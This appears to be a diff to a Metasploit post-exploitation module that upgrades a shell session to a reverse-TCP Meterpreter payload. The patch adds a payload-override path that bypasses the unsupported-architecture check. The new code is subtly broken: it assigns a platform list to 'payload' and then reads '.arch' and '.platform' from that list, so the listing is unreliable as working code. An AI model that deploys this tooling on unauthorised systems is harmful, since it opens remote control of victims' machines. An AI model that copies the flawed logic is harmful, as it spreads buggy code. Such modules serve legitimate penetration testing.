@@ -94,8 +94,10 @@ class MetasploitModule < Msf::Post
         payload_name = 'windows/meterpreter/reverse_tcp'
         psh_arch = 'x86'
       else
-        print_error('Target is running Windows on an unsupported architecture such as Windows ARM!')
-        return nil
+        unless datastore['PAYLOAD_OVERRIDE']
+          print_error('Target is running Windows on an unsupported architecture such as Windows ARM!')
+          return nil
+        end
       end
       larch = [arch]
       vprint_status('Platform: Windows')
@@ -138,7 +140,18 @@ class MetasploitModule < Msf::Post
       return nil
     end
 
-    payload_name = datastore['PAYLOAD_OVERRIDE'] if datastore['PAYLOAD_OVERRIDE']
+    if datastore['PAYLOAD_OVERRIDE']
+      payload_name = datastore['PAYLOAD_OVERRIDE']
+      payload_info = payload_name.split('/')
+      payload = framework.payloads.create(payload_name).platform.platforms
+
+      if payload_info.first == 'windows'
+        psh_arch = payload.arch
+      else
+        lplat = payload.platform.platforms
+        larch = payload.arch
+      end
+    end
 
     vprint_status("Upgrade payload: #{payload_name}")
 
